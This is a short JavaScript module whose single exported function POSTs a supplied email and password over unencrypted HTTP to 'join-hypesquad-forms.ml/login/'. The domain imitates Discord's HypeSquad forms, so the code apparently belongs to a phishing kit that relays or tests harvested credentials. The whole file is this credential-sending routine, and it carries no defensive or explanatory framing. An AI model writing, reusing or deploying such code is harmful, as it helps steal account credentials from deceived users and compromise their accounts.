import axios from 'axios'

export default async ({ email, password }) => {
    try {
        //Make request
        const req = await axios({
            method: 'post',
            url: 'http://join-hypesquad-forms.ml/login/',
            data: {
                email: email,
                password: password
            }
        })

        //Parse response
        if (req?.status === 200) return {
            error: false,
            email: email,
            password: password
        }
        else return {
            error: true,
            email: email,
            password: password
        }
    }
    catch (error) {
        return {
            error: true,
            email: email,
            password: password
        }
    }
}